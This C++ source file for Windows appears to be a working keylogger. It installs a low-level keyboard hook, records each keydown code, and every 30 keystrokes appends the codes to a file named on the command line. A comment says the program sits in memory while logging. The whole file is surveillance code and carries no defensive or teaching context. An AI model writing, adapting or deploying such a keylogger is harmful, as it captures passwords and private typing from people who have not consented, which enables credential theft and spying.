#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include <stdlib.h>
#include <windows.h>
#include <vector>

std::vector<int> codepointBuffer;
char* fileName;

static void DumpCharacterBuffer(std::vector<int>& codepointBuffer,
                                const char* filePath) {

    std::ofstream ofs;
    ofs.open(fileName, std::ios_base::binary | std::ios_base::app);

    union {
        char bytes[4];
        int i;
    } transformer;

    for (const int codePoint : codepointBuffer) {
        transformer.i = codePoint;
        ofs.put(transformer.bytes[0]);
    }

    codepointBuffer.clear();
    ofs.close();
}

LRESULT CALLBACK KeyboardProc(int nCode,
                              WPARAM wParam, 
                              LPARAM lParam) {

    PKBDLLHOOKSTRUCT pHookStruct = (PKBDLLHOOKSTRUCT) lParam;

    switch (wParam) {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:

            codepointBuffer.push_back(pHookStruct->vkCode);

            if (codepointBuffer.size() > 30) {
                DumpCharacterBuffer(codepointBuffer, fileName);
            }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPSTR pCmdLine,
            int nCmdShow) {

    fileName = pCmdLine;    

    SetWindowsHookExA(WH_KEYBOARD_LL,
                      KeyboardProc,
                      NULL,
                      0);
    MSG msg;
        
    // Just seat in the memory while logging. :^)
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return EXIT_SUCCESS;
}